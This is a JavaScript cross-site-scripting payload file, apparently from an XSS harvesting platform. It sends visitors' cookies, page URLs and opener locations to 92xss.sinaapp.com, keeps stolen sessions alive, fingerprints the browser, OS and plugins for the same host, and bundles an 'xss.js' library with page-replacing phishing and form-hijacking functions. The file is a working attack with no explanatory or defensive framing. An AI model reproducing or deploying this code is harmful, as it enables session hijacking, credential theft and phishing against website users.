new Image().src='http://v1lady.com/plus/smtpemail_for_xss.php?msg=ttz';
(function(){(new Image()).src='http://92xss.sinaapp.com/index.php?do=api&id=vwYBkv&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
if('1'==1){keep=new Image();keep.src='http://92xss.sinaapp.com/index.php?do=keepsession&id=vwYBkv&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
var info = {};
var deployJava=function(){function g(n){if(!d.debug){return}if(console.log){console.log(n)}else{alert(n)}}var d={debug:null,version:"20120801",firefoxJavaVersion:null,oldMimeType:"application/npruntime-scriptable-plugin;DeploymentToolkit",mimeType:"application/java-deployment-toolkit",browserName:null,browserName2:null,getJREs:function(){var r=new Array();if(this.isPluginInstalled()){var q=this.getPlugin();var n=q.jvms;for(var p=0;p<n.getLength();p++){r[p]=n.get(p).version}}else{var o=this.getBrowser();if(o=="MSIE"){if(this.testUsingActiveX("1.7.0")){r[0]="1.7.0"}else{if(this.testUsingActiveX("1.6.0")){r[0]="1.6.0"}else{if(this.testUsingActiveX("1.5.0")){r[0]="1.5.0"}else{if(this.testUsingActiveX("1.4.2")){r[0]="1.4.2"}else{if(this.testForMSVM()){r[0]="1.1"}}}}}}else{if(o=="Netscape Family"){this.getJPIVersionUsingMimeType();if(this.firefoxJavaVersion!=null){r[0]=this.firefoxJavaVersion}else{if(this.testUsingMimeTypes("1.7")){r[0]="1.7.0"}else{if(this.testUsingMimeTypes("1.6")){r[0]="1.6.0"}else{if(this.testUsingMimeTypes("1.5")){r[0]="1.5.0"}else{if(this.testUsingMimeTypes("1.4.2")){r[0]="1.4.2"}else{if(this.browserName2=="Safari"){if(this.testUsingPluginsArray("1.7.0")){r[0]="1.7.0"}else{if(this.testUsingPluginsArray("1.6")){r[0]="1.6.0"}else{if(this.testUsingPluginsArray("1.5")){r[0]="1.5.0"}else{if(this.testUsingPluginsArray("1.4.2")){r[0]="1.4.2"}}}}}}}}}}}}}if(this.debug){for(var p=0;p<r.length;++p){g("[getJREs()] We claim to have detected Java SE "+r[p])}}return r},getJPIVersionUsingMimeType:function(){for(var o=0;o<navigator.mimeTypes.length;++o){var p=navigator.mimeTypes[o].type;var n=p.match(/^application\/x-java-applet;jpi-version=(.*)$/);if(n!=null){this.firefoxJavaVersion=n[1];if("Opera"!=this.browserName2){break}}}},isPluginInstalled:function(){var n=this.getPlugin();if(n&&n.jvms){return true}else{return false}},allowPlugin:function(){this.getBrowser();var n=("Safari"!=this.browserName2&&"Opera"!=this.browserName2);return n},getPlugin:function(){this.refresh();var n=null;if(this.allowPlugin()){n=document.getElementById("deployJavaPlugin")}return n},compareVersionToPattern:function(u,o,q,r){if(u==undefined||o==undefined){return false}var v="^(\\d+)(?:\\.(\\d+)(?:\\.(\\d+)(?:_(\\d+))?)?)?$";var w=u.match(v);if(w!=null){var t=0;var x=new Array();for(var p=1;p<w.length;++p){if((typeof w[p]=="string")&&(w[p]!="")){x[t]=w[p];t++}}var n=Math.min(x.length,o.length);if(r){for(var p=0;p<n;++p){if(x[p]<o[p]){return false}else{if(x[p]>o[p]){return true}}}return true}else{for(var p=0;p<n;++p){if(x[p]!=o[p]){return false}}if(q){return true}else{return(x.length==o.length)}}}else{return false}},getBrowser:function(){if(this.browserName==null){var n=navigator.userAgent.toLowerCase();g("[getBrowser()] navigator.userAgent.toLowerCase() -> "+n);if((n.indexOf("msie")!=-1)&&(n.indexOf("opera")==-1)){this.browserName="MSIE";this.browserName2="MSIE"}else{if(n.indexOf("iphone")!=-1){this.browserName="Netscape Family";this.browserName2="iPhone"}else{if((n.indexOf("firefox")!=-1)&&(n.indexOf("opera")==-1)){this.browserName="Netscape Family";this.browserName2="Firefox"}else{if(n.indexOf("chrome")!=-1){this.browserName="Netscape Family";this.browserName2="Chrome"}else{if(n.indexOf("safari")!=-1){this.browserName="Netscape Family";this.browserName2="Safari"}else{if((n.indexOf("mozilla")!=-1)&&(n.indexOf("opera")==-1)){this.browserName="Netscape Family";this.browserName2="Other"}else{if(n.indexOf("opera")!=-1){this.browserName="Netscape Family";this.browserName2="Opera"}else{this.browserName="?";this.browserName2="unknown"}}}}}}}g("[getBrowser()] Detected browser name:"+this.browserName+", "+this.browserName2)}return this.browserName},testUsingActiveX:function(n){var p="JavaWebStart.isInstalled."+n+".0";if(typeof ActiveXObject=="undefined"||!ActiveXObject){g("[testUsingActiveX()] Browser claims to be IE, but no ActiveXObject object?");return false}try{return(new ActiveXObject(p)!=null)}catch(o){return false}},testForMSVM:function(){var o="{08B0E5C0-4FCB-11CF-AAA5-00401C608500}";if(typeof oClientCaps!="undefined"){var n=oClientCaps.getComponentVersion(o,"ComponentID");if((n=="")||(n=="5,0,5000,0")){return false}else{return true}}else{return false}},testUsingMimeTypes:function(o){if(!navigator.mimeTypes){g("[testUsingMimeTypes()] Browser claims to be Netscape family, but no mimeTypes[] array?");return false}for(var p=0;p<navigator.mimeTypes.length;++p){s=navigator.mimeTypes[p].type;var n=s.match(/^application\/x-java-applet\x3Bversion=(1\.8|1\.7|1\.6|1\.5|1\.4\.2)$/);if(n!=null){if(this.compareVersions(n[1],o)){return true}}}return false},testUsingPluginsArray:function(o){if((!navigator.plugins)||(!navigator.plugins.length)){return false}var n=navigator.platform.toLowerCase();for(var p=0;p<navigator.plugins.length;++p){s=navigator.plugins[p].description;if(s.search(/^Java Switchable Plug-in (Cocoa)/)!=-1){if(this.compareVersions("1.5.0",o)){return true}}else{if(s.search(/^Java/)!=-1){if(n.indexOf("win")!=-1){if(this.compareVersions("1.5.0",o)||this.compareVersions("1.6.0",o)){return true}}}}}if(this.compareVersions("1.5.0",o)){return true}return false},compareVersions:function(q,r){var o=q.split(".");var n=r.split(".");for(var p=0;p<o.length;++p){o[p]=Number(o[p])}for(var p=0;p<n.length;++p){n[p]=Number(n[p])}if(o.length==2){o[2]=0}if(o[0]>n[0]){return true}if(o[0]<n[0]){return false}if(o[1]>n[1]){return true}if(o[1]<n[1]){return false}if(o[2]>n[2]){return true}if(o[2]<n[2]){return false}return true},refresh:function(){navigator.plugins.refresh(false);var n=this.getBrowser();if(n=="Netscape Family"&&this.allowPlugin()){var o=document.getElementById("deployJavaPlugin");if(o==null){this.writeEmbedTag()}}},writeEmbedTag:function(){var n=false;if(navigator.mimeTypes!=null){for(var o=0;o<navigator.mimeTypes.length;o++){if(navigator.mimeTypes[o].type==this.mimeType){if(navigator.mimeTypes[o].enabledPlugin){document.write('<embed id="deployJavaPlugin" type="'+this.mimeType+'" hidden="true" />');n=true}}}if(!n){for(var o=0;o<navigator.mimeTypes.length;o++){if(navigator.mimeTypes[o].type==this.oldMimeType){if(navigator.mimeTypes[o].enabledPlugin){document.write('<embed id="deployJavaPlugin" type="'+this.oldMimeType+'" hidden="true" />')}}}}}}};return d}();

//网站域名
info.domain = document.domain;
/*
//网页标题
info.title = document.title;
*/
//屏幕分辨率
info.screen = function(){
	var c = "";
	if (self.screen) {c = screen.width+"x"+screen.height;}
	return c;
}();

//浏览器和版本
info.browser = function(){
	var Sys = {};
    var ua = navigator.userAgent.toLowerCase();
    var s;
    (s = ua.match(/msie ([\d.]+)/)) ? Sys.ie = s[1] :
    (s = ua.match(/firefox\/([\d.]+)/)) ? Sys.firefox = s[1] :
    (s = ua.match(/chrome\/([\d.]+)/)) ? Sys.chrome = s[1] :
    (s = ua.match(/opera.([\d.]+)/)) ? Sys.opera = s[1] :
    (s = ua.match(/version\/([\d.]+).*safari/)) ? Sys.safari = s[1] : 0;
    if (Sys.ie) return {name: 'IE'  || "", version: Sys.ie || "0"};
    if (Sys.firefox) return {name: 'Firefox' || "", version: Sys.firefox || "0"};
    if (Sys.chrome) return {name: 'Chrome' || "", version: Sys.chrome || "0"};
    if (Sys.opera) return {name: 'Opera' || "", version: Sys.opera || "0"};
    if (Sys.safari) return {name: 'Safari' || "", version: Sys.safari || "0"};
}();

//浏览器语言
info.lang = function(){
	var type=navigator.appName   
	if (type=="Netscape"){   
		var lang = navigator.language; 
	}else{   
		var lang = navigator.userLanguage;   
	}
	return lang;
}();

//系统平台
info.system = function (){
	var appVer = navigator.userAgent;
    var _pf = navigator.platform;  
    if(_pf == "Win32" || _pf == "Windows"){  
        if(appVer.indexOf("Windows NT 6.0") > -1  || appVer.indexOf("Windows Vista") > -1){  
            return 'Windows Vista';   
        }else if(appVer.indexOf("Windows NT 6.1") > -1 || appVer.indexOf("Windows 7") > -1){  
            return 'Windows 7';
		}else if(appVer.indexOf("Windows NT 6.2") > -1 || appVer.indexOf("Windows 8") > -1){
			return 'Windows 8';
        }else{  
            try{  
                var _winName = Array('2000','XP','2003');  
                var _ntNum = appVer.match(/Windows NT 5.\d/i).toString();  
                return 'Windows ' + _winName[_ntNum.replace(/Windows NT 5.(\d)/i,"$1")];  
            }catch(e){
				return 'Windows';
			}  
        }  
    }else if(_pf == "Mac68K" || _pf == "MacPPC" || _pf == "Macintosh"){  
        return "Mac";             
    }else if(_pf == "X11"){  
        return "Unix";    
    }else if(String(_pf).indexOf("Linux") > -1){  
        return "Linux";   
    }else{  
        return "Unknow";      
    }         
}();  

//flash版本
info.flash = function(){
	var f="",n=navigator;
	if (n.plugins && n.plugins.length) {
		for (var ii=0;ii<n.plugins.length;ii++) {
			if (n.plugins[ii].name.indexOf('Shockwave Flash')!=-1) {
				f=n.plugins[ii].description.split('Shockwave Flash ')[1];
				break;
			}
		}
	}
	else
	if (window.ActiveXObject) {
		for (var ii=10;ii>=2;ii--) {
			try {
				var fl=eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash."+ii+"');");
				if (fl) {
					f=ii + '.0';
					break;
				}
			}
			 catch(e) {}
		}
	}
	return f;
}(); 
//java版本
info.java = deployJava.getJREs();

function json2str(o) {
	var arr = [];
	var fmt = function(s) {
		if (typeof s == 'object' && s != null) return json2str(s);
		return /^(string|number)$/.test(typeof s) ? "\"" + s + "\"" : s;
	}
	for (var i in o) arr.push("\"" + i + "\":" + fmt(o[i]));
	return '{' + arr.join(',') + '}';
} 

var i = json2str(info);
x=new Image();
x.src = "http://92xss.sinaapp.com/probe.php?id=vwYBkv&c="+i;;;var xss = function(){
  var x = {
   'name':'xss.js',
    'version':'0.1',
    'author':'jackmasa'
 };
  
  x.x=function(id){return document.getElementById(id)};
 
  //容错取值
  x.e=function(_){try{return eval('('+_+')')}catch(e){return''}};
 
  //浏览器 
  x.i={
   i:!!self.ActiveXObject,
   c:!!self.chrome,
    f:self.mozPaintCount>-1,
   o:!!self.opera,
   s:!self.chrome&&!!self.WebKitPoint
  };
  
  //UA
  x.ua = navigator.userAgent;
 
  //判断是否为苹果手持设备
 x.apple=x.ua.match(/ip(one|ad|od)/i)!=null;
 
  //随机数
 x.rdm=function(){return~~(Math.random()*100000)};

 //url编码(UTF8)
 x.ec=encodeURIComponent;

  x.html=document.getElementsByTagName('html')[0];
  
  /*
   * 销毁一个元素
  */
 x.kill=function(e){
   e.parentElement.removeChild(e);
 };

  /*
   *绑定事件
   */
 x.bind=function(e,name,fn){
   e.addEventListener?e.addEventListener(name,fn,false):e.attachEvent("on"+name,fn);
 };
  
  /*
   * dom准备完毕时执行函数
  */
 x.ready=function(fn){
   if(!x.i.i){
     x.bind(document,'DOMContentLoaded',fn);
   }else{
      var s = setInterval(function(){
       try{
          document.body.doScroll('left');
         clearInterval(s);
         fn();
       }catch(e){}
     },4);
   }
 }

 /*
   * 同源检测
  */
 x.o=function(url){
    var link = x.dom('<a href="'+encodeURI(url)+'">',2);
    return link.protocol+link.hostname+':'+link.port==location.protocol+location.hostname+':'+link.port;
  };
  
  /*
   * html to dom
   */
 x.dom=function(html,gcsec){
   var tmp = document.createElement('span');
   tmp.innerHTML=html;
   var e = tmp.children[0];
    e.style.display='none';
   x.html.appendChild(e);
    gcsec>>0>0&&setTimeout(function(){
     x.kill(e);
    },gcsec*1000);
    return e;
 };

  /*
   * ajax
  */
 x.ajax = function(url,params,callback){
   (params instanceof Function)&&(callback=params,params=void(0));
   var XHR = (!x.o(url)&&window.XDomainRequest)||
          window.XMLHttpRequest||
         (function(){return new ActiveXObject('MSXML2.XMLHTTP')});
   var xhr = new XHR();
    xhr.open(params?'post':'get',url);
    try{xhr.setRequestHeader('content-type','application/x-www-form-urlencoded')}catch(e){}
   callback&&(xhr.onreadystatechange = function() {
      (this.readyState == 4 && ((this.status >= 200 && this.status <= 300) || this.status == 304))&&callback.apply(this,arguments);
   });
   xhr.send(params);
 };

  /*
   * no ajax
   */
 x.najax=function(url,params){
   if(params){
     var form = x.dom('<form method=post accept-charset=utf-8>');
      form.action=url;
      for(var name in params){
        var input = document.createElement('input');
        input.name=name;
        input.value=params[name];
       form.appendChild(input);
      }
     var iframe = x.dom('<iframe name=_'+x.rdm()+'_>',6);
      form.target=iframe.name;
      form.submit();
    }else{
      new Image().src=url+'&'+x.rdm();
    }
 };

  /*
   * 钓鱼
  */
 x.phish=function(url){
    x.ajax(url,function(){
      document.open();
      document.write(this.responseText);
      document.close();
     history.replaceState&x.o(url)&&history.replaceState('','',url);
   })
  };

  /*
   * 表单劫持
  */
 x.xform=function(form,action){
    form.old_action=form.action,form.old_target=form.target,form.action=action;
   var iframe = x.dom('<iframe name=_'+x.rdm()+'_>');
    form.target=iframe.name;
    setTimeout(function(){
      x.bind(iframe,'load',function(){
        form.action=form.old_action,form.target=form.old_target,form.onsubmit=null,form.submit();
     })
    },30);
  };
  
  /*
   * 函数代理
  */
 x.proxy=function(fn,before,after){
    return function(){
      before&&before.apply(this,arguments);
     var result = fn.apply(this,arguments);
      after&&after.apply(this,arguments);
     return result;
    }
 };
  
  return x;
}();
